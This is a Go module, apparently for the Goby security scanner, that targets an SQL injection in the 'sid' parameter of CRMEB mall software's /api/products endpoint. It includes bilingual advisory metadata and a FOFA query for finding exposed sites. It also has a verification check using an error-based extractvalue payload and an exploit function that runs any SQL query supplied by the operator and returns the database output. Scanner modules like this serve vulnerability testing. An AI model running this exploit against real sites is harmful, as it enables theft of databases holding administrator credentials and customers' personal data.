package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CRMEB DaTong sid sqli",
    "Description": "CRMEB open version v4 is a free and open source mall system, UINAPP+thinkphp6 framework mall. <p>The sid parameter under the path of CRMEB open version /api/products has unfiltered SQL statement splicing, resulting in SQL injection.</p>",
    "Impact": "CRMEB DaTong sid sqli",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.crmeb.com\">https://www.crmeb.com</a></p><p>1.Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "CRMEB-MS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "CRMEB 打通版 sid 参数 SQL 注入漏洞",
            "Description": "<p>CRMEB打通版v4是免费开源商城系统，UINAPP+thinkphp6框架商城.</p><p>CRMEB打通版/api/products路径下的sid参数存在未经过滤的SQL语句拼接 导致SQL注入。</p>",
            "Impact": "<p>CRMEB打通版/api/products路径下的sid参数存在未经过滤的SQL语句拼接 导致SQL注入。攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.crmeb.com\">https://www.crmeb.com</a></p><p>1、使用预编译，部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "CRMEB管理系统",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "CRMEB DaTong sid sqli",
            "Description": "CRMEB open version v4 is a free and open source mall system, UINAPP+thinkphp6 framework mall. </p><p>The sid parameter under the path of CRMEB open version /api/products has unfiltered SQL statement splicing, resulting in SQL injection.",
            "Impact": "CRMEB DaTong sid sqli",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.crmeb.com\">https://www.crmeb.com</a></p><p>1.Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "CRMEB-MS",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"CRMEB\" && body=\"/h5/js/app\"",
    "GobyQuery": "body=\"CRMEB\" && body=\"/h5/js/app\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://gitee.com/ZhongBangKeJi/CRMEB",
    "DisclosureDate": "2021-09-11",
    "References": [
        "https://www.crmeb.com"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "createSelect",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "CRMEB"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "8576"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandOut := 100 + rand.Intn(99)
			RandOut1 := fmt.Sprintf("%x", md5.Sum([]byte(strconv.Itoa(RandOut))))
			uri := fmt.Sprintf(`/api/products?page=1&limit=8&keyword=keyword&sid=extractvalue(1,concat(char(126),md5(%v)))&news=0&priceOrder=&salesOrder=`, RandOut)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "syntax error") && strings.Contains(resp.RawBody, RandOut1[1:len(RandOut1)-5])
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			uri := fmt.Sprintf(`/api/products?page=1&limit=8&keyword=keyword&sid=1+OR+1)AND(SELECT+extractValue(1,concat(0x7e,(%s)))&news=0&priceOrder=&salesOrder=`, url.QueryEscape(cmd))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
